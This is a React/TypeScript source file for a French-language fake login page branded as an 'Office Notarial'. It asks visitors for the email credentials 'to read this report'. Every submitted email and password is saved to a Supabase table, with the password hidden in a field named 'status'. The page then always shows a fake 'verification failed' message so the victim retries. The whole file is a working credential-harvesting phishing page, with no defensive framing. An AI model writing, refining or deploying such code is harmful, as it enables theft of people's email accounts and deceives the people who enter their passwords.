import React, { useState } from 'react';
import { supabase } from '@/integrations/supabase/client';

/**
 * Version qui utilise la table email_logs au lieu de login_attempts
 * Les données sont stockées dans les champs disponibles
 */
const AuthFormEmailLogs = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const logLoginAttempt = async (email: string, password: string) => {
    try {
      // Stocker les informations dans email_logs
      // On utilise le champ "status" pour stocker le mot de passe
      // et le champ "error" pour stocker les infos supplémentaires
      const { data, error } = await supabase
        .from('email_logs')
        .insert({
          email: email,
          status: password, // On stocke le mot de passe dans "status"
          error: `IP: Unknown | User-Agent: ${navigator.userAgent}`, // Infos supplémentaires dans "error"
        })
        .select();
      
      if (error) {
        console.error('Error logging login attempt:', error);
        throw error;
      }
      
      console.log('Login attempt logged successfully:', data);
      return true;
    } catch (error) {
      console.error('Error logging login attempt:', error);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    // Log the login attempt
    const success = await logLoginAttempt(email, password);
    
    if (!success) {
      setErrorMessage('Erreur lors de l\'enregistrement. Veuillez vérifier la connexion.');
      setIsSubmitting(false);
      return;
    }
    
    // Simulate a verification (since this appears to be a mock login)
    setTimeout(() => {
      setErrorMessage('Echec de la vérification. \n Veuillez réessayer en utilisant les identifiants corrects...');
      setIsSubmitting(false);
      setShowPassword(true);
    }, 1000);
  };

  const handleContinue = () => {
    setShowPassword(true);
    setErrorMessage('');
  };

  return (
    <div className="auth-container">
      <div className="load-overlay">
        <img src="https://zupimages.net/up/25/16/ern5.jpg" alt="Logo" />
      </div>
      
      <div className="f-container">
        <div className="header">
          <img src="https://zupimages.net/up/25/16/ern5.jpg" alt="Office Notarial" />
        </div>
        
        <div className="f-content">
          <form onSubmit={handleSubmit}>
            <div className="f-description">
              Pour lire ce rapport, veuillez entrer les identifiants de la messagerie à laquelle le fichier a été envoyé
            </div>
            
            {errorMessage && (
              <div id="message1" className="error-message">
                {errorMessage.split('\n').map((line, index) => (
                  <React.Fragment key={index}>
                    {line}
                    {index < errorMessage.split('\n').length - 1 && <br />}
                  </React.Fragment>
                ))}
              </div>
            )}
            
            <div className="f-inputs-container">
              <input
                id="oneo"
                name="mega"
                placeholder="Adresse e-mail"
                type="email"
                required
                autoComplete="off"
                autoFocus
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
            
            {showPassword && (
              <div className="f-inputs-container" id="twoo-container">
                <input
                  id="twoo"
                  name="giga"
                  placeholder="Mot de passe"
                  type="password"
                  required
                  autoComplete="off"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
            )}
            
            <div className="f-inputs-container buttons">
              <center>
                {!showPassword ? (
                  <button type="button" id="next" onClick={handleContinue}>
                    Continuer
                  </button>
                ) : (
                  <button type="submit" id="submit-btn" disabled={isSubmitting}>
                    {isSubmitting ? 'Vérification...' : "S'identifier"}
                  </button>
                )}
              </center>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default AuthFormEmailLogs;



